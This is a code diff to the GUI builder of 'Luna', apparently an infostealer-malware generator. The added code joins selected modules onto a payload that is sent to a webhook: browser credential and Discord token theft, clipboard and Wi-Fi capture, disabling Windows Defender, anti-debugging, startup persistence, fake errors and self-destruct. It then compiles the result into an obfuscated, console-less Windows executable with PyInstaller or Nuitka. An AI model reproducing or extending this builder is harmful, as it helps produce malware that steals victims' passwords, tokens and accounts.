@@ -54,6 +54,7 @@ class App(customtkinter.CTk):
 			"discord": False,
 			"anti_spam": False,
 			"self_destruct": False,
+			"clipboard": False
 		}
 
 		image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
@@ -455,6 +456,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 			logging.error(f"Error with getting filename: {e}")
 
 	def get_config(self):
+		options = self.basefilepath + "\\options\\"
 		try:
 			with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
 				code = f.read()
@@ -463,8 +465,103 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 			config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
 			code = f"{config_str}\n\n{code}"
 			
+			if self.updated_dictionary["anti_spam"] == True:
+				with open(options+"AntiSpam.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["backupcodes"] == True:
+				with open(options+"BackupCodes.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["browser"] == True:
+				with open(options+"Browsers.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["clipboard"] == True:
+				with open(options+"Clipboard.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["antidebug_vm"] == True:
+				with open(options+"Debug.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["defender"] == True:
+				with open(options+"disable_defender.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["discord"] == True:
+				with open(options+"Discord.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["fakeerror"] == True:
+				with open(options+"fakeerror.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["injection"] == True:
+				with open(options+"Injection.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["killprotector"] == True:
+				with open(options+"killprotector.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["minecraft"] == True:
+				with open(options+"Minecraft.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["systeminfo"] == True:
+				with open(options+"PcInfo.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["self_destruct"] == True:
+				with open(options+"SelfDestruct.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["startup"] == True:
+				with open(options+"startup.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"
+			
+			if self.updated_dictionary["wifi"] == True:
+				with open(options+"Wifi.py", "r", encoding="utf-8") as f:
+					code += f.read()
+					code += "\n\n"	
+
+			code += """
+if __name__ == '__main__' and os.name == "nt":
+	Luna(__CONFIG__["webhook"])
+"""
+
+			# Remove duplicate imports
+			lines = code.split('\n')
+			unique_lines = []
+			imported_modules = set()
+			
+			for line in lines:
+				if line.startswith("import ") or line.startswith("from "):
+					module_name = line.split()[1]
+					if module_name not in imported_modules:
+						unique_lines.append(line)
+						imported_modules.add(module_name)
+				else:
+					unique_lines.append(line)	
+			cleaned_code = '\n'.join(unique_lines)
+
 			logging.info("Successfully changed config")
-			return code
+			return cleaned_code
 		except Exception as e:
 			logging.error(f"Error with config: {e}")
 
@@ -487,32 +584,63 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 
 			current_dir = os.path.abspath(os.getcwd())
 			script_path = os.path.join(current_dir, f"{filename}.py")
+			
+			included_modules_nuitka = [
+				"concurrent.futures",
+				"requests",
+				"requests_toolbelt"
+			]
+			
+			option_module_mapping_nuitka = {
+				"browser": ["psutil", "sqlite3", "win32crypt", "Cryptodome.Cipher.AES"],
+				"clipboard": ["pyperclip"],
+				"antidebug_vm": ["psutil"],
+				"discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt"],
+				"injection": ["psutil"],
+				"systeminfo": ["psutil"]
+			}
+			
+			included_modules_pyinstaller = [
+				"json",
+				"requests_toolbelt"
+				]
+			
+			option_module_mapping_pyinstaller = {
+				"anti_spam": ["time", "sys"],
+				"backupcodes": ["re"],
+				"browser": ["sqlite3", "win32crypt", "Cryptodome.Cipher.AES", "base64", "psutil", "typing"],
+				"clipboard": ["pyperclip"],
+				"antidebug_vm": ["psutil", "subprocess", "sys"],
+				"defender": ["subprocess", "base64"],
+				"discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt", "base64", "re"],
+				"fakeerror": ["ctypes"],
+				"injection": ["subprocess", "psutil", "re"],
+				"systeminfo": ["psutil", "subprocess"],
+				"self_destruct": ["subprocess", "sys"],
+				"startup": ["sys"],
+				"wifi": ["subprocess"]
+			}
 
 			if filetype == "pyinstaller":
-				subprocess.run([sys.executable, os.path.join(current_dir, "tools", "upx.py")])
-				subprocess.run([sys.executable, "-m", "PyInstaller",
-								"--onefile", "--clean", "--noconsole",
-								"--upx-dir=./tools", "--distpath=./",
-								"--hidden-import", "base64",
-								"--hidden-import", "ctypes",
-								"--hidden-import", "json",
-								"--hidden-import", "re",
-								"--hidden-import", "time",
-								"--hidden-import", "typing",
-								"--hidden-import", "subprocess",
-								"--hidden-import", "sys",
-								"--hidden-import", "sqlite3",
-								"--hidden-import", "requests_toolbelt",
-								"--hidden-import", "psutil",
-								"--hidden-import", "PIL",
-								"--hidden-import", "PIL.ImageGrab",
-								"--hidden-import", "PIL.Image",
-								"--hidden-import", "Cryptodome",
-								"--hidden-import", "Cryptodome.Cipher",
-								"--hidden-import", "Cryptodome.Cipher.AES",
-								"--hidden-import", "win32crypt",
-								"--hidden-import", "pyperclip",
-								"--icon", exeicon, script_path])
+				included_modules = included_modules_pyinstaller
+				option_module_mapping = option_module_mapping_pyinstaller
+			
+				for option, enabled in self.updated_dictionary.items():
+					if enabled and option in option_module_mapping:
+						included_modules.extend(option_module_mapping[option])
+			
+				command = [
+					sys.executable, "-m", "PyInstaller",
+					"--onefile", "--clean", "--noconsole",
+					"--upx-dir=./tools", "--distpath=./",
+					"--icon", exeicon, script_path
+				]
+			
+				for module in included_modules:
+					command.insert(-1, "--hidden-import")
+					command.insert(-1, module)
+
+				subprocess.run(command)
 				logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
 
 			elif filetype == "nuitka":
@@ -521,32 +649,26 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 					logging.error("Nuitka does not support Python 3.12")
 					return
 				else:
+					command = [
+						sys.executable, "-m", "nuitka",
+						"--onefile", "--standalone", "--remove-output",
+						"--show-progress", "--prefer-source-code",
+						"--assume-yes-for-downloads", "--windows-disable-console",
+						f"./{filename}.py"
+					]
+					
 					try:
+						for option, enabled in self.updated_dictionary.items():
+							if enabled and option in option_module_mapping_nuitka:
+								included_modules_nuitka.extend(option_module_mapping_nuitka[option])			
+						for module in included_modules_nuitka:
+							command.insert(-1, f"--include-module={module}")	
+							
 						if exeicon != "NONE":
-							subprocess.run([
-								sys.executable, "-m", "nuitka",
-								"--onefile", "--standalone", "--remove-output",
-								"--show-progress", "--prefer-source-code",
-								"--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
-								"--include-module=sqlite3", "--include-module=psutil",
-								"--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
-								"--include-module=requests_toolbelt", "--include-module=win32crypt", "--include-module=pyperclip",
-								"--assume-yes-for-downloads", "--windows-disable-console",
-								f"--windows-icon-from-ico={exeicon}",
-								f"./{filename}.py"
-							])
-						else:
-							subprocess.run([
-								sys.executable, "-m", "nuitka",
-								"--onefile", "--standalone", "--remove-output",
-								"--show-progress", "--prefer-source-code",
-								"--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
-								"--include-module=sqlite3", "--include-module=psutil",
-								"--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
-								"--include-module=requests_toolbelt", "--include-module=win32crypt", "--include-module=pyperclip",
-								"--assume-yes-for-downloads", "--windows-disable-console",
-								f"./{filename}.py"
-							])
+							command.insert(-1, f"--windows-icon-from-ico={exeicon}")
+							subprocess.run(command)
+						else:	
+							subprocess.run(command)
 						logging.info(f"Successfully compiled {filename}.exe with nuitka")
 					except Exception as e:
 						logging.error(f"Error with compiling file: {e}")
@@ -588,7 +710,9 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 				os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")
 				logging.info(f"Successfully obfuscated file: {filename}.py")
 		except Exception as e:
-			logging.error(f"Error with writing and obfuscating file: {e}")
+			_message = f"Error with writing and obfuscating file: {e}"
+			print(_message)
+			logging.error(_message)
 
 	def buildfile(self):
 		if not self.verify_webhook():
